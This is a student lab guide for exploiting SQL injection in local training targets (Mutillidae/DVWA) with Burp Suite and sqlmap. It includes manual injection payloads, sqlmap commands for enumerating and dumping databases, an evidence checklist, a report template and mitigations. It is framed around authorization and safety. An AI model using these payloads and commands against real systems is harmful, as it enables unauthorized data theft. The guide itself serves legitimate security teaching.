# EXPT-08-SQL-Injection-Using-SQLmap.md

_(Copy this whole file into your repo as `EXPT-08-SQL-Injection-Using-SQLmap.md`. — **Note:** this file **does not** include Mutillidae install steps — it assumes Mutillidae (or DVWA) is already installed and reachable at `http://localhost/mutillidae/`.)_

---

# Experiment 8 — SQL Injection using SQLmap (Kali + Mutillidae + Burp)

**Platform:** Kali Linux + Mutillidae (or DVWA) + Burp Suite + sqlmap
**Purpose (one-liner):** detect and safely demonstrate SQL injection vulnerabilities in a lab target, using both quick manual checks and automated exploitation with `sqlmap`. Capture reproducible evidence for exam submission and explain mitigations.
**Safety / ethics:** **Only** test authorized lab targets (Mutillidae / DVWA / teacher-provided VMs). Limit intrusive actions, document scope/time, and avoid destructive commands. Use `--batch` to avoid interactive prompts and small `--level/--risk` during exams.

---

## Contents

1. Short theory (2–3 sentences)
2. Prerequisites (software + lab)
3. Quick checklist (one-page)
4. Manual detection (quick, safe tests)
5. Using sqlmap from a saved Burp request (recommended exam flow)
6. Common sqlmap commands you will use (examples)
7. Interpreting sqlmap output & what to save as evidence
8. Safe post-discovery actions (enumeration, selective dump)
9. Fallback: DVWA (if Mutillidae fails)
10. Mitigations / exact phrasing for viva
11. What to capture & sample evidence filenames (put in `evidence/`)
12. Minimal lab report template (copy-paste)
13. Appendix — commands & quick tips

---

## 1) Short theory (2–3 lines to tell the teacher)

SQL Injection is a server-side vulnerability where an application incorrectly includes user input inside SQL statements, allowing an attacker to modify queries (bypass authentication, read or modify data). `sqlmap` is an automated tool that discovers injection points and (with authorization) can enumerate databases/tables and dump rows—use it only on lab targets and with minimal options in exams.

---

## 2) Prerequisites

- Kali Linux (updated) with `sqlmap` installed (`sudo apt install sqlmap` if missing).
- Mutillidae or DVWA running at `http://localhost/mutillidae/`.
- Burp Suite (Community/Pro) configured as proxy and Burp CA imported.
- Ability to save an HTTP request from Burp (Proxy → HTTP history → right-click → Save selected items).
- Workspace: `~/expt08/` to save evidence.

---

## 3) Quick checklist (one-page before starting exam)

- [ ] Confirm target & authorization in writing.
- [ ] Start app and proxy browser through Burp.
- [ ] Find candidate parameter (search box, `id=`, `product?id=`, login `username`/`password` etc.).
- [ ] Do quick manual test (`' OR '1'='1`) in parameter and observe response differences. Save a screenshot.
- [ ] Save the full raw HTTP request from Burp as `request.txt`.
- [ ] Run safe `sqlmap` commands with `--batch --level=1 --risk=1` and capture output to `evidence/sqlmap_output.txt`.
- [ ] Limit extraction: enumerate DB names (`--dbs`) first; only dump a small table/rows if instructor allows.
- [ ] Save all outputs & screenshots into `evidence/` and create `finding_summary.md`.

---

## 4) Manual detection (quick, safe tests)

**Goal:** show a quick non-destructive check to justify using sqlmap.

1. Identify a GET parameter: e.g. `http://localhost/mutillidae/product.php?id=2`.
2. In browser (or Repeater) append a single quote and observe behavior:

   - Request: `?id=2'` — look for SQL error messages, different page content, or differing response length.

3. Basic payloads (manual, non-destructive):

   - `1' OR '1'='1`
   - `2' -- `
   - `1' UNION SELECT NULL-- ` (avoid complex UNION if not needed)

**If you see:** SQL error, change in rows, or content indicating injection → proceed to sqlmap. Save the request & a screenshot `evidence/01_manual_test.png`.

---

## 5) Using sqlmap from a saved Burp request (recommended exam flow)

**Why:** saving a full request lets sqlmap replicate exact headers, cookies, and POST data (login forms) reliably.

### A. Capture request in Burp

1. In Burp Proxy → HTTP history, find the request that contains the vulnerable parameter.
2. Right-click → **Save selected items** → save as `~/expt08/request.txt`. This file includes raw HTTP request (start-line, headers, body).

### B. Basic safe scan with sqlmap

```bash
cd ~/expt08
# safe non-interactive test
sqlmap -r request.txt --batch --level=1 --risk=1 -v 2 -o --threads=3 --output-dir=output_sqlmap
```

Explanation:

- `-r request.txt` — use saved request (most reliable).
- `--batch` — non-interactive (useful in exams).
- `--level=1 --risk=1` — low intrusiveness.
- `-v 2` — moderate verbosity.
- `--threads=3` — speed up a bit without being noisy.
- `--output-dir=output_sqlmap` — keeps outputs organized.

**Inspect output**: `output_sqlmap/*.txt` and `evidence/sqlmap_output.txt` (you can redirect stdout to a file when running).

---

## 6) Common sqlmap commands & examples

**1) Test a parameter directly (GET)**

```bash
sqlmap -u "http://localhost/mutillidae/product.php?id=2" --batch --level=1 --risk=1 -v 2
```

**2) Use saved request (recommended)**

```bash
sqlmap -r request.txt --batch --level=1 --risk=1 -v 2
```

**3) Enumerate databases**

```bash
sqlmap -r request.txt --dbs --batch --level=2 --risk=1 -v 2
# outputs databases names
```

**4) List tables from a specific DB**

```bash
sqlmap -r request.txt -D <dbname> --tables --batch --level=2 --risk=1
```

**5) List columns from a table**

```bash
sqlmap -r request.txt -D <dbname> -T <table> --columns --batch
```

**6) Dump specific columns/rows (with caution; ask instructor)**

```bash
sqlmap -r request.txt -D <dbname> -T <table> -C "id,username,password" --dump --batch
# use -C to limit columns. Do not dump whole DB unless permitted.
```

**7) Authentication forms / cookies**
If the vulnerable request requires existing session cookies or login:

```bash
# either include Cookie header in request.txt (captured) or:
sqlmap -r request.txt --cookie="PHPSESSID=abcd1234; other=val" --batch
# For POST forms, request.txt handles --data automatically.
```

**8) Use a safe level when testing a login bypass**

```bash
sqlmap -r request.txt --data="username=admin&password=*" --batch --level=1 --risk=0
```

(Only if necessary—prefer saved request approach.)

**9) Output to file**

```bash
sqlmap -r request.txt --dbs --batch -o --output-dir=output_sqlmap
# sqlmap will save logs and found data under output_sqlmap/
```

---

## 7) Interpreting sqlmap output & what to save

**Key things sqlmap prints:**

- Injection type (boolean-based blind, error-based, UNION-based, time-based)
- Parameter name & position (e.g., `GET parameter 'id' is injectable`)
- Evidence (response pieces used to detect)
- Databases / tables / columns discovered (if enumeration ran)
- Dumps (if you used `--dump`)

**Save these as evidence:**

- `output_sqlmap/target_info.txt` or redirect stdout to `evidence/sqlmap_output.txt`.
- If `--dbs` shows names, copy that output into `evidence/02_sqlmap_dbs.txt`.
- If you dump a table (only with permission), save as `evidence/03_dump_users.csv` (limit rows).
- Screenshots: `evidence/04_sqlmap_console.png` showing sqlmap run in terminal.

---

## 8) Safe post-discovery actions (enumeration & minimal dump)

**Recommended exam policy:**

1. **Enumerate** (`--dbs`, `--tables`) only to show that you can identify schema. Save results.
2. **If allowed**, dump a single non-sensitive column or a few rows from a non-personal table (e.g., `products`), not users’ passwords. If you must show credentials for the exercise, request instructor consent.
3. **Avoid destructive payloads** (`--os-shell`, `--file-write`, `--sql-shell`) unless explicitly authorized.

**Example selective dump** (only with permission):

```bash
sqlmap -r request.txt -D schooldb -T students -C "id,name" --dump --batch --output-dir=output_sqlmap
```

---

## 9) Fallback: DVWA (if Mutillidae fails)

- DVWA has clear SQLi labs under **SQL Injection** modules. Use DVWA’s "SQL Injection (GET/POST)" pages with `Security: Low` to practice safe `sqlmap` detection and dumping. The process is identical: capture the request, save it, run `sqlmap -r request.txt --batch ...`.

---

## 10) Mitigations / exact phrasing for viva

Use these concise remediation statements:

- **Use parameterized queries / prepared statements** — never concatenate user input into SQL strings.
- **Use least-privileged DB accounts** — application DB user must have only required permissions (no `DROP`, no schema-level rights unless needed).
- **Input validation & canonicalization** — validate input types and lengths, but _never_ rely on input filtering alone for SQLi.
- **Stored procedures with parameterization** (if used correctly) can reduce risk.
- **Error handling / verbose errors disabled** — do not expose DB errors to users (stack traces, SQL errors).
- **WAF & DB activity monitoring** — use as defense-in-depth to detect injection patterns.
- **Encrypt sensitive data at rest** and use modern password hashing (bcrypt/Argon2) for credentials (note: SQLi might reveal password hashes — use proper hashing & salting).

---

## 11) What to capture & sample evidence filenames (put these in `~/expt08/evidence/`)

1. `evidence/01_manual_test.png` — screenshot of manual `' OR '1'='1` test in browser or Repeater showing different behavior.
2. `evidence/02_request_txt` — the raw request file saved from Burp (`request.txt`).
3. `evidence/03_sqlmap_output.txt` — sqlmap stdout saved (first run showing injection detection).
4. `evidence/04_sqlmap_dbs.txt` — output from `--dbs`.
5. `evidence/05_sqlmap_tables.txt` — output from `-D <dbname> --tables`.
6. `evidence/06_sqlmap_dump_sample.csv` — if a small permitted dump was performed (1-5 rows, non-sensitive columns). **Only** do this with permission.
7. `evidence/07_sqlmap_console.png` — screenshot of running sqlmap showing findings.
8. `commands.txt` — commands you ran (copy/paste exact commands).
9. `finding_summary.md` — one-page summary with remediation.

---

## 12) Minimal lab report template (copy-paste into `finding_summary.md`)

```
# Finding Summary — EXPT-08 SQL Injection using sqlmap
**Student:** <Your Name>
**Date:** <dd-mm-yyyy>
**Target:** http://localhost/mutillidae/
**Tools:** Kali Linux, Burp Suite, sqlmap

## Steps performed
1. Performed quick manual check by injecting `' OR '1'='1` into `id` parameter and observed changed output (see evidence/01_manual_test.png).
2. Saved the exact HTTP request from Burp as `request.txt` (evidence/02_request_txt).
3. Ran sqlmap safely: `sqlmap -r request.txt --batch --level=1 --risk=1 -v 2 --output-dir=output_sqlmap`. Output saved as `evidence/03_sqlmap_output.txt`.
4. Enumerated databases (`--dbs`) and tables (`--tables`) and saved results in evidence.
5. (Optional, instructor-permitted) Dumped small sample of `products` table limited to 3 rows; saved as `evidence/06_sqlmap_dump_sample.csv`.

## Key findings
- [High] Parameter `id` in `product.php?id=` is vulnerable to SQL injection (sqlmap detection). Evidence: `evidence/03_sqlmap_output.txt`.
- [Info] Enumerated DB names: `schooldb`, `mutillidae_db` (example). Evidence: `evidence/04_sqlmap_dbs.txt`.

## Remediation
- Use prepared statements/parameterized queries.
- Use least-privileged DB user accounts and validate inputs server-side.
- Disable verbose error messages and implement logging/WAF.

## Commands run
- sqlmap -r request.txt --batch --level=1 --risk=1 -v 2 --output-dir=output_sqlmap
- sqlmap -r request.txt --dbs --batch
- sqlmap -r request.txt -D <dbname> --tables --batch

## Conclusion
Demonstrated detection and safe enumeration of SQLi vulnerability on a lab target. Recommended immediate removal of direct string concatenation in SQL, use of parameterized queries, and application of least privilege. Evidence is in the `evidence/` folder.
```

---

## 13) Appendix — commands & quick tips (copy-paste)

```bash
# workspace
mkdir -p ~/expt08/evidence
cd ~/expt08

# capture a request in Burp and save as request.txt (do in Burp UI)

# safe sqlmap quick test (non-interactive)
sqlmap -r request.txt --batch --level=1 --risk=1 -v 2 --threads=3 --output-dir=output_sqlmap > evidence/03_sqlmap_output.txt 2>&1

# enumerate DBs
sqlmap -r request.txt --dbs --batch --level=2 > evidence/04_sqlmap_dbs.txt

# enumerate tables of a chosen DB (example)
sqlmap -r request.txt -D schooldb --tables --batch > evidence/05_sqlmap_tables.txt

# dump a limited set of columns/rows (only with permission)
sqlmap -r request.txt -D schooldb -T students -C "id,name" --dump --batch --dump-format=csv --output-dir=output_sqlmap

# view sqlmap saved logs
ls output_sqlmap

# take screenshot example (select area)
gnome-screenshot -a -f ~/expt08/evidence/07_sqlmap_console.png
```

**Quick tips**

- **Always** use `-r request.txt` for accuracy (it preserves cookies/headers).
- Start with `--level=1 --risk=1` and `--batch` to keep the run small and non-interactive. Increase level/risk only if instructor allows and you document why.
- Use `--threads` moderately (2–5) to speed up without being noisy.
- If `sqlmap` reports time-based or boolean-based injection, note the type in your report.
- Avoid `--os-shell`, `--file-write`, `--sql-shell` in exams unless explicitly permitted. Those are powerful and potentially destructive.

---

### Final exam strategy

1. Demonstrate a short manual test (`' OR '1'='1`) and screenshot.
2. Show the saved `request.txt` from Burp and explain what it contains (headers, cookies, POST body).
3. Run one safe `sqlmap` command (`--dbs`) and show `evidence/sqlmap_output.txt`.
4. If asked, show how you would remediate (prepared statements & least-privilege) — use the remediation bullets.
5. Keep evidence folder tidy and present `finding_summary.md` first to the examiner.

---
